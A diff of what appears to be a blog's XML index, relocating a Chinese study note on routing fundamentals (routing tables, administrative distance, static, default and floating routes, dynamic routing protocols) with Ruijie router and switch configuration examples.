-<p>8、PC3收到以太网帧，解封装出ICMP Echo，需要回复ICMP  Reply，源IP&#x3D;192.168.2.100 目的IP&#x3D;192.168.1.200</p>
-<p>8、PC3收到以太网帧，解封装出ICMP Echo，需要回复ICMP  Reply，源IP&#x3D;192.168.2.100 目的IP&#x3D;192.168.1.200</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104140.png" alt="4" loading="lazy"></p>
-<h3 id="认识路由设备"><a href="#认识路由设备" class="headerlink" title="认识路由设备"></a>认识路由设备</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104144.png" alt="5" loading="lazy"></p>
-<h3 id="路由的下一跳"><a href="#路由的下一跳" class="headerlink" title="路由的下一跳"></a>路由的下一跳</h3><ul>
-<li>路由设备进行路由转发，下一台设备的端口IP地址 </li>
-<li>下一跳地址由路由表决定，PC客户端的默认下一跳地址通常称为“网关” <ul>
-<li>如图，PC2想要与PC3通信</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104149.png" alt="6" loading="lazy"></p>
-<ul>
-<li>下一跳地址是路由设备根据路由表选择的最佳路径 <ul>
-<li>如图，PC2想要与PC3通信</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104153.png" alt="7" loading="lazy"></p>
-<h3 id="路由表的构成与维护"><a href="#路由表的构成与维护" class="headerlink" title="路由表的构成与维护"></a>路由表的构成与维护</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104158.png" alt="8" loading="lazy"></p>
-<h3 id="路由表的构成"><a href="#路由表的构成" class="headerlink" title="路由表的构成"></a>路由表的构成</h3><p>路由表是路由器转发数据报文的判断依据。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104202.png" alt="9" loading="lazy"></p>
-<h4 id="路由表的度量值"><a href="#路由表的度量值" class="headerlink" title="路由表的度量值"></a>路由表的度量值</h4><ul>
-<li>度量值（Metric）：路由协议用来衡量路径优劣的参数。表示到达目的地的代价总和</li>
-<li>影响度量值的因素：线路带宽、跳数、线路延迟·、线路使用率、线路可信度等</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104207.png" alt="10" loading="lazy"></p>
-<h3 id="路由表的内容"><a href="#路由表的内容" class="headerlink" title="路由表的内容"></a>路由表的内容</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104210.png" alt="11" loading="lazy"></p>
-<h3 id="管理距离"><a href="#管理距离" class="headerlink" title="管理距离"></a>管理距离</h3><ul>
-<li>管理距离（Administrative Distance），也叫优先级，用来衡量路由源的可信度 </li>
-<li>管理距离值越低，可信度越高。只有可信度最高的路由会被添加进路由表</li>
-<li>管理距离默认值由厂商自定义</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104214.png" alt="12" loading="lazy"></p>
-<h3 id="路由加表原则"><a href="#路由加表原则" class="headerlink" title="路由加表原则"></a>路由加表原则</h3><p>只有最佳路径才会被添加进路由表中，形成路由条目</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104217.png" alt="13" loading="lazy"></p>
-<h3 id="路由选路原则-——-最长子网掩码匹配原则"><a href="#路由选路原则-——-最长子网掩码匹配原则" class="headerlink" title="路由选路原则 —— 最长子网掩码匹配原则"></a>路由选路原则 —— 最长子网掩码匹配原则</h3><ul>
-<li><p>路由设备基于数据包的目的IP地址，按照最长子网掩码匹配原则查找路由表 </p>
-</li>
-<li><p>根据查询结果转发。查询无果则丢弃数据包</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104223.png" alt="14" loading="lazy"></p>
-</li>
-</ul>
-<h2 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h2><h3 id="静态路由-1"><a href="#静态路由-1" class="headerlink" title="静态路由"></a>静态路由</h3><ul>
-<li>由网络管理员手工配置的路由信息，当网络拓扑发生变化时，管理员需要手工修改静态路由信息 </li>
-<li>静态路由信息是本地有效的，不会传递给其他的路由器 </li>
-<li>静态路由一般适用于比较简单的网络环境，大型和复杂的网络环境通常不宜采用静态路由 使用静态路由好处是网络安全保密性高 </li>
-<li>使用全局配置命令ip route，配置静态路由 <ul>
-<li>下一跳地址必须是直连网络上可达的地址 </li>
-<li>点对点连接时，下一跳地址可用出接口代替</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104229.png" alt="15" loading="lazy"></p>
-<h3 id="静态路由配置案例1-——-基础配置"><a href="#静态路由配置案例1-——-基础配置" class="headerlink" title="静态路由配置案例1 —— 基础配置"></a>静态路由配置案例1 —— 基础配置</h3><ul>
-<li>在3台路由器上配置静态路由，使Net 1与Net 2能互相通信 <ul>
-<li>选择100M链路，路径为：Net1-R1-R2-R3-Net2</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.2
-R2(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.1
-R2(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.6
-R3(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.5</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104233.png" alt="16" loading="lazy"></p>
-<h3 id="静态路由配置案例1-——-查看静态路由"><a href="#静态路由配置案例1-——-查看静态路由" class="headerlink" title="静态路由配置案例1 —— 查看静态路由"></a>静态路由配置案例1 —— 查看静态路由</h3><ul>
-<li>在特权用户模式显示IP路由表<ul>
-<li>ruijie#show ip route</li>
-</ul>
-</li>
-<li>查看R1、R2和R3的路由表</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1#show ip route
-C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
-C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1 
-S 192.168.2.0&#x2F;24 [1&#x2F;0] via 172.16.1.2</code></pre>
-
-<pre class="language-none"><code class="language-none">R2#show ip route
-C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2 
-C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
-S 192.168.1.0&#x2F;24 [1&#x2F;0] via 172.16.1.1
-S 192.168.2.0&#x2F;24 [1&#x2F;0] via 172.16.1.6</code></pre>
-
-<pre class="language-none"><code class="language-none">R3#show ip route
-C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
-C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-S 192.168.1.0&#x2F;24 [1&#x2F;0] via 172.16.1.5</code></pre>
-
-
-
-<h3 id="静态路由配置案例2-——-默认路由"><a href="#静态路由配置案例2-——-默认路由" class="headerlink" title="静态路由配置案例2 —— 默认路由"></a>静态路由配置案例2 —— 默认路由</h3><ul>
-<li>默认静态路由是特殊的静态路由，它的目标网络和子网掩码均为0.0.0.0（默认路由有可能是动态路由）</li>
-<li>在R1和R3上配置默认路由，使R1与R3的100M链路故障时，可以使用10M链路</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1(config)#ip route 0.0.0.0 0.0.0.0 172.16.1.10
-R3(config)#ip route 0.0.0.0 0.0.0.0 172.16.1.9</code></pre>
-
-<pre class="language-none"><code class="language-none">R1#show ip route
-C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5 
-C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-S* 0.0.0.0&#x2F;0 [1&#x2F;0] via 172.16.1.10</code></pre>
-
-<pre class="language-none"><code class="language-none">R3#show ip route
-C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
-C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1 
-S* 0.0.0.0&#x2F;0 [1&#x2F;0] via 172.16.1.9</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104239.png" alt="17" loading="lazy"></p>
-<h3 id="静态路由配置案例3-——-浮动静态路由"><a href="#静态路由配置案例3-——-浮动静态路由" class="headerlink" title="静态路由配置案例3 —— 浮动静态路由"></a>静态路由配置案例3 —— 浮动静态路由</h3><ul>
-<li>浮动路由就是在静态路由的基础上，加上管理距离参数，管理距离越小，可信度越高 </li>
-<li>配置了多条浮动路由，只有可信度最高（管理距离最小）的一条浮动路由会被添加到路由表中</li>
-<li>当可信度最高的浮动路由失效后，可信度次高的浮动会被添加到路由表中</li>
-<li>在R1和R3上配置浮动路由，使得正常状态路径为：Net1-R1-R2-R3-Net2 </li>
-<li>断开R1与R2、R3与R2的连接后，路径切换为：Net1-R1-R3-Net2</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.2 10
-R1(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.10 100
-R3(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.5 10
-R3(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.9 100</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104243.png" alt="18" loading="lazy"></p>
-<h3 id="静态路由配置案例3-——-查看浮动静态路由"><a href="#静态路由配置案例3-——-查看浮动静态路由" class="headerlink" title="静态路由配置案例3 —— 查看浮动静态路由"></a>静态路由配置案例3 —— 查看浮动静态路由</h3><ul>
-<li>配置完成后查看R1和R3的路由表</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1#show ip route
-C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
-C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2 
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-S 192.168.2.0 &#x2F;24 [10&#x2F;0] via 172.16.1.2 </code></pre>
-
-<pre class="language-none"><code class="language-none">R3#show ip route
-C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
-C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5 
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-S 192.168.1.0 &#x2F;24 [10&#x2F;0] via 172.16.1.5 </code></pre>
-
-<ul>
-<li>断开R1与R2、R3与R2的连接后，查看R1和R3的路由表</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1#show ip route
-C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-S 192.168.2.0 &#x2F;24 [100&#x2F;0] via 172.16.1.10 </code></pre>
-
-<pre class="language-none"><code class="language-none">R3#show ip route
-C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-S 192.168.1.0 &#x2F;24 [100&#x2F;0] via 172.16.1.9</code></pre>
-
-<h3 id="静态路由配置案例4-——-三层交换机上配置静态路由"><a href="#静态路由配置案例4-——-三层交换机上配置静态路由" class="headerlink" title="静态路由配置案例4 —— 三层交换机上配置静态路由"></a>静态路由配置案例4 —— 三层交换机上配置静态路由</h3><ul>
-<li>三层交换机也有路由功能，可实现不同VLAN间通信 </li>
-<li>在两个三层交换机上的SVI(switch virtual interface)口配置IP作为三层接口</li>
-<li>三层交换机之间的互联：（方案1）可以选择用trunk （方案2）也可以选择用三层路由接口</li>
-<li>在两台三层交换机上配置静态路由</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104249.png" alt="19" loading="lazy"></p>
-<ul>
-<li>SW1、SW2的SVI与静态路由配置 <ul>
-<li>通过给VLAN10、20、30、40、800配置IP地址并no shutdown，使交换机具有多个虚拟的路由口</li>
-<li>VLAN10、20、30、40的SVI地址可以分别作为相应VLAN内PC机的默认网关 </li>
-<li>（方案1）VLAN 800的SVI地址可以作为SW1与SW2直连通信的路由地址 </li>
-<li>通过配置静态路由，使不同VLAN、不同IP网络间的PC机能互相通信</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">SW1(config)#vlan 800
-SW1(config)#interface vlan 10
-SW1(config-if)#ip address 192.168.1.254 255.255.255.0
-SW1(config)#interface vlan 20
-SW1(config-if)#ip address 192.168.2.254 255.255.255.0 
-SW1(config)#interface vlan 800
-SW1(config-if)#ip address 10.0.0.1 255.255.255.252
-SW1(config)#ip route 192.168.3.0 255.255.255.0 10.0.0.2
-SW1(config)#ip route 192.168.4.0 255.255.255.0 10.0.0.2 </code></pre>
-
-<pre class="language-none"><code class="language-none">SW2(config)#vlan 800
-SW2(config)#interface vlan 30
-SW2(config-if)#ip address 192.168.3.254 255.255.255.0 
-SW2(config)#interface vlan 40
-SW2(config-if)#ip address 192.168.4.254 255.255.255.0 
-SW2(config)#interface vlan 800
-SW2(config-if)#ip address 10.0.0.2 255.255.255.252
-SW2(config)#ip route 192.168.1.0 255.255.255.0 10.0.0.1
-SW2(config)#ip route 192.168.2.0 255.255.255.0 10.0.0.1</code></pre>
-
-<ul>
-<li>SW1、SW2的SVI与静态路由配置 <ul>
-<li>通过给VLAN10、20、30、40、800配置IP地址并no shutdown，使交换机具有多个虚拟的路由口 </li>
-<li>VLAN10、20、30、40的SVI地址可以分别作为相应VLAN内PC机的默认网关</li>
-<li>（方案2）SW1与SW2的G0&#x2F;5接口可以转化为三层路由接口，作为互联地址 </li>
-<li>通过配置静态路由，使不同VLAN、不同IP网络间的PC机能互相通信</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">SW1(config)#interface vlan 10
-SW1(config-if)#ip address 192.168.1.254 255.255.255.0
-SW1(config)#interface vlan 20
-SW1(config-if)#ip address 192.168.2.254 255.255.255.0 
-SW1(config)#interface GigabitEthernet 0&#x2F;5
-SW1(config-if)#no switchport
-SW1(config-if)# ip address 10.0.0.1 255.255.255.252
-SW1(config)#ip route 192.168.3.0 255.255.255.0 10.0.0.2
-SW1(config)#ip route 192.168.4.0 255.255.255.0 10.0.0.2 </code></pre>
-
-<pre class="language-none"><code class="language-none">SW2(config)#interface vlan 30
-SW2(config-if)#ip address 192.168.3.254 255.255.255.0 
-SW2(config)#interface vlan 40
-SW2(config-if)#ip address 192.168.4.254 255.255.255.0 
-SW2(config)#interface GigabitEthernet 0&#x2F;5
-SW2(config-if)#no switchport
-SW2(config-if)# ip address 10.0.0.2 255.255.255.252
-SW2(config)#ip route 192.168.1.0 255.255.255.0 10.0.0.1
-SW2(config)#ip route 192.168.2.0 255.255.255.0 10.0.0.1</code></pre>
-
-<h3 id="静态路由配置案例4-——-三层交换机上配置静态路由-1"><a href="#静态路由配置案例4-——-三层交换机上配置静态路由-1" class="headerlink" title="静态路由配置案例4 —— 三层交换机上配置静态路由"></a>静态路由配置案例4 —— 三层交换机上配置静态路由</h3><ul>
-<li>SW1、SW2的SVI与静态路由配置 <ul>
-<li>通过给VLAN10、20、30、40、800配置IP地址并no shutdown，使交换机具有多个虚拟的路由口 </li>
-<li>VLAN10、20、30、40的SVI地址可以分别作为相应VLAN内PC机的默认网关 </li>
-<li>（方案2）SW1与SW2的G0&#x2F;5接口可以转化为三层路由接口，作为互联地址 </li>
-<li>通过配置静态路由，使不同VLAN、不同IP网络间的PC机能互相通信</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">SW1(config)#interface vlan 10
-SW1(config-if)#ip address 192.168.1.254 255.255.255.0
-SW1(config)#interface vlan 20
-SW1(config-if)#ip address 192.168.2.254 255.255.255.0 
-SW1(config)#interface GigabitEthernet 0&#x2F;5
-SW1(config-if)#no switchport
-SW1(config-if)# ip address 10.0.0.1 255.255.255.252
-SW1(config)#ip route 192.168.3.0 255.255.255.0 10.0.0.2
-SW1(config)#ip route 192.168.4.0 255.255.255.0 10.0.0.2 </code></pre>
-
-<pre class="language-none"><code class="language-none">SW2(config)#interface vlan 30
-SW2(config-if)#ip address 192.168.3.254 255.255.255.0 
-SW2(config)#interface vlan 40
-SW2(config-if)#ip address 192.168.4.254 255.255.255.0 
-SW2(config)#interface GigabitEthernet 0&#x2F;5
-SW2(config-if)#no switchport
-SW2(config-if)# ip address 10.0.0.2 255.255.255.252
-SW2(config)#ip route 192.168.1.0 255.255.255.0 10.0.0.1
-SW2(config)#ip route 192.168.2.0 255.255.255.0 10.0.0.1</code></pre>
-
-<h3 id="静态路由配置案例5-——-汇总路由"><a href="#静态路由配置案例5-——-汇总路由" class="headerlink" title="静态路由配置案例5 —— 汇总路由"></a>静态路由配置案例5 —— 汇总路由</h3><ul>
-<li>路由汇总的定义：把多条路由条目汇总成一条路由条目。</li>
-<li>路由汇总的作用：收缩路由表，减轻路由器的负担，提高路由器的转发效率 </li>
-<li>分别在R1和R2上仅配置一条静态路由（不能使用默认路由），使所有PC能互相通信</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104258.png" alt="20" loading="lazy"></p>
-<ul>
-<li>配置R1路由器</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104303.png" alt="21" loading="lazy"></p>
-<h4 id="静态路由配置案例5-——-路由汇总的限制"><a href="#静态路由配置案例5-——-路由汇总的限制" class="headerlink" title="静态路由配置案例5 —— 路由汇总的限制"></a>静态路由配置案例5 —— 路由汇总的限制</h4><ul>
-<li>在特定场景下，才可实施路由汇总</li>
-<li>在以下的场景中，在R2上不能做路由汇总</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104308.png" alt="22" loading="lazy"></p>
-<h2 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h2><h3 id="动态路由协议"><a href="#动态路由协议" class="headerlink" title="动态路由协议"></a>动态路由协议</h3><ul>
-<li>目前网络项目中的主流路由协议有：RIP、OSPF、BGP</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104312.png" alt="23" loading="lazy"></p>
-<ul>
-<li>这是路由器用来计算、维护网络路由信息的协议，通常有一定的算法，工作在传输层或应用层 <ul>
-<li>RIP基于UDP，端口号520 </li>
-<li>OSPF基于IP，协议号89 </li>
-<li>BGP基于TCP，端口号179</li>
-</ul>
-</li>
-<li>路由协议工作机制的四个主要步骤： <ul>
-<li>邻居发现：路由器通过发送广播或组播报文的方式发现网络中的邻居，并基于特定参数来建立邻居关系。 </li>
-<li>路由交换：每台路由器将自己已知的路由相关信息发给相邻路由器。 </li>
-<li>路由计算：每台路由器运行某种算法，计算出最终的路由表。</li>
-<li>路由维护：路由器之间通过周期性地发送协议报文来维护邻居信息。</li>
-</ul>
-</li>
-</ul>
-<h3 id="动态路由基本概念"><a href="#动态路由基本概念" class="headerlink" title="动态路由基本概念"></a>动态路由基本概念</h3><ul>
-<li>衡量路由协议的主要指标 <ul>
-<li>协议计算的正确性：协议使用的算法能够计算出最优的路由，且正确无自环。 </li>
-<li>路由收敛速度：当网络的拓扑结构发生变化之后，能够迅速感知并及时更新相应的路由信息。 </li>
-<li>协议占用系统开销：协议自身占用的资源开销（内存、CPU、网络带宽)。</li>
-<li>协议自身的安全性：协议自身不易受攻击，有安全机制。 </li>
-<li>协议适用网络规模：协议可以应用在何种拓扑结构和规模的网络中。</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104316.png" alt="24" loading="lazy"></p>
-<h3 id="动态路由协议的分类"><a href="#动态路由协议的分类" class="headerlink" title="动态路由协议的分类"></a>动态路由协议的分类</h3><ul>
-<li>按照管理范围分类 <ul>
-<li>IGP（内部网关协议）：RIP、EIGRP、OSPF、IS-IS（园区网常用协议） </li>
-<li>EGP（外部网关协议）：BGP（主要应用在金融，政府电子政务网，运营商网络）</li>
-</ul>
-</li>
-<li>按照算法分类 <ul>
-<li>距离矢量路由协议：RIP、BGP </li>
-<li>链路状态路由协议：OSPF、IS-IS</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104320.png" alt="25" loading="lazy"></p>
-<h3 id="距离矢量路由协议"><a href="#距离矢量路由协议" class="headerlink" title="距离矢量路由协议"></a>距离矢量路由协议</h3><ul>
-<li>路由以矢量（距离、方向）的方式通告出去</li>
-<li>距离矢量协议直接传送各自的路由表信息 <ul>
-<li>每台路由器从邻居路由器直接获取路由信息，并将这些路由信息连同自己的本地路由信息发送给其他邻居</li>
-<li>如此逐跳传递，达到全网同步。每个路由器都不了解整个网络拓扑 </li>
-<li>它们只知道与自己直接相连的网络情况，并根据从邻居得到的路由信息更新自己的路由</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104350.png" alt="26" loading="lazy"></p>
-<h3 id="链路状态路由协议"><a href="#链路状态路由协议" class="headerlink" title="链路状态路由协议"></a>链路状态路由协议</h3><ul>
-<li>基于Dijkstra（迪克斯特拉）算法的最短路径优先（SPF）算法，比距离矢量路由协议复杂 </li>
-<li>路由器并不向邻居直接传递“路由表项”，而是通告给邻居链路状态 </li>
-<li>链路状态信息包括：接口IP地址和掩码、网络类型、链路开销、链路上所有相邻路由器</li>
-<li>运行该路由协议的路由器不是简单地从相邻的路由器学习路由，而是把路由器分成区域，收集区域的所有 的路由器的链路状态信息，根据状态信息和SPF算法生成网络拓扑结构，每一个路由器再根据拓扑结构计 算出路由</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104354.png" alt="27" loading="lazy"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>锐捷</category>
-      </categories>
-      <tags>
-        <tag>锐捷</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>胖瘦AP组网方案</title>
     <url>/posts/82dddbd2/</url>
     <content><![CDATA[<div class="danger">
@@ -9594,6 +9210,390 @@ dc0c.5cd6.60b3 10.0.0.2 0074.9c5a.f76c&#x2F;2 10 10 192.0M&#x2F;D&#x2F;ac WPA2_P
 <li>集中转发：数据流通过AC，并且由AC解封装CAPWAP协议； </li>
 <li>本地转发：数据流不通过AC，没有CAPWAP数据隧道；</li>
 </ul>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>锐捷</category>
+      </categories>
+      <tags>
+        <tag>锐捷</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>路由技术介绍</title>
+    <url>/posts/f2727247/</url>
+    <content><![CDATA[<div class="danger">
+
+<blockquote>
+<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
+</blockquote>
+</div>
+
+<h2 id="路由技术介绍"><a href="#路由技术介绍" class="headerlink" title="路由技术介绍"></a>路由技术介绍</h2><h3 id="为什么需要路由"><a href="#为什么需要路由" class="headerlink" title="为什么需要路由"></a>为什么需要路由</h3><ul>
+<li>PC的网卡在进行发送数据的时候，网络层将检查目的IP与本网卡的IP地址是否处于一个网段<ul>
+<li>如果属于一个网段，则直接用ARP解析目的IP的MAC地址 </li>
+<li>如果不属于一个网段，则用ARP解析网关的MAC地址</li>
+</ul>
+</li>
+<li>二层交换网络（同一广播域&#x2F;VLAN）内，不同网段的主机之间无法直接通信</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104121.png" alt="1" loading="lazy"></p>
+<h3 id="路由的定义"><a href="#路由的定义" class="headerlink" title="路由的定义"></a>路由的定义</h3><ul>
+<li>从一个接口上收到数据包，根据数据包的目的地址进行定向和转发的过程 </li>
+<li>路由器依据路由表选择下一跳地址&#x2F;出接口并转发数据，实现跨IP网段通信</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104128.png" alt="2" loading="lazy"></p>
+<h4 id="直接路由数据通信分析"><a href="#直接路由数据通信分析" class="headerlink" title="直接路由数据通信分析"></a>直接路由数据通信分析</h4><ul>
+<li>直接路由：同一个IP网络内的通信 </li>
+<li>回想一下：同一个LAN中的PC1和PC2之间的通信过程：PC1&gt;ping 192.168.1.200</li>
+</ul>
+<ol>
+<li>PC1封装一个负载为ICMP Echo的IP报文：源IP&#x3D;192.168.1.100 目的IP&#x3D;192.168.1.200 </li>
+<li>PC1将IP报文封装到以太网帧中，源MAC为本地网卡的MAC，需要确定目的地的MAC </li>
+<li>PC1先判断目标IP是否处于本地子网，结果发现“是” 方式：本地IP与本地掩码是否等于目标IP与本地掩码，如果结果相等，则说明目标IP处于本地子网 </li>
+<li>查本地ARP缓存是否存在目标IP（PC2）对 应的MAC，如果不存在，则通过ARP获取</li>
+<li>成功封装以太网帧，源MAC为PC1的MAC， 目标MAC为PC2的MAC，从PC1网卡发出</li>
+<li>交换机根据MAC地址表转发以太网帧。</li>
+<li>PC2收到以太网帧，解封装出ICMP Echo 需要回复ICMP Reply的IP报文 源IP&#x3D;192.168.1.200 目的IP&#x3D;192.168.1.100</li>
+<li>PC2重复②-⑤的处理流程</li>
+</ol>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104133.png" alt="3" loading="lazy"></p>
+<h3 id="间接路由数据通信分析"><a href="#间接路由数据通信分析" class="headerlink" title="间接路由数据通信分析"></a>间接路由数据通信分析</h3><ul>
+<li>间接路由：不同IP网络内的通信 </li>
+<li>再思考一下：如果PC2与其他LAN中的PC3通信，又该如何：PC2&gt;ping 192.168.2.100</li>
+</ul>
+<p>1、PC2封装一个负载为ICMP Echo的IP报文：源IP&#x3D;192.168.1.200 目的IP&#x3D;192.168.2.100</p>
+<p>2、将IP报文封装到以太网帧中，源MAC为本地网卡的MAC，需要确定目的地的MAC</p>
+<p>3、PC2先判断目标IP是否处于本地子网，结果发现“不是” </p>
+<p>4、PC2如果配置了默认网关，查本地ARP缓存是 否存在网关IP对应的MAC，如果不存在，则通过 ARP获取ARP表项</p>
+<p>5、成功封装以太网帧，源MAC为PC2的MAC， 目标MAC为网关的MAC。由网卡接口发出</p>
+<p>6、交换机根据MAC地址表转发以太网帧，将会发送给网关</p>
+<p>7、网关路由器收到以太网帧，解封装出IP报文。根据报文中的目 标IP信息寻找出接口，在出接口重新封装以太网帧，再发出</p>
+<p>8、PC3收到以太网帧，解封装出ICMP Echo，需要回复ICMP  Reply，源IP&#x3D;192.168.2.100 目的IP&#x3D;192.168.1.200</p>
+<p>8、PC3收到以太网帧，解封装出ICMP Echo，需要回复ICMP  Reply，源IP&#x3D;192.168.2.100 目的IP&#x3D;192.168.1.200</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104140.png" alt="4" loading="lazy"></p>
+<h3 id="认识路由设备"><a href="#认识路由设备" class="headerlink" title="认识路由设备"></a>认识路由设备</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104144.png" alt="5" loading="lazy"></p>
+<h3 id="路由的下一跳"><a href="#路由的下一跳" class="headerlink" title="路由的下一跳"></a>路由的下一跳</h3><ul>
+<li>路由设备进行路由转发，下一台设备的端口IP地址 </li>
+<li>下一跳地址由路由表决定，PC客户端的默认下一跳地址通常称为“网关” <ul>
+<li>如图，PC2想要与PC3通信</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104149.png" alt="6" loading="lazy"></p>
+<ul>
+<li>下一跳地址是路由设备根据路由表选择的最佳路径 <ul>
+<li>如图，PC2想要与PC3通信</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104153.png" alt="7" loading="lazy"></p>
+<h3 id="路由表的构成与维护"><a href="#路由表的构成与维护" class="headerlink" title="路由表的构成与维护"></a>路由表的构成与维护</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104158.png" alt="8" loading="lazy"></p>
+<h3 id="路由表的构成"><a href="#路由表的构成" class="headerlink" title="路由表的构成"></a>路由表的构成</h3><p>路由表是路由器转发数据报文的判断依据。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104202.png" alt="9" loading="lazy"></p>
+<h4 id="路由表的度量值"><a href="#路由表的度量值" class="headerlink" title="路由表的度量值"></a>路由表的度量值</h4><ul>
+<li>度量值（Metric）：路由协议用来衡量路径优劣的参数。表示到达目的地的代价总和</li>
+<li>影响度量值的因素：线路带宽、跳数、线路延迟·、线路使用率、线路可信度等</li>
+</ul>
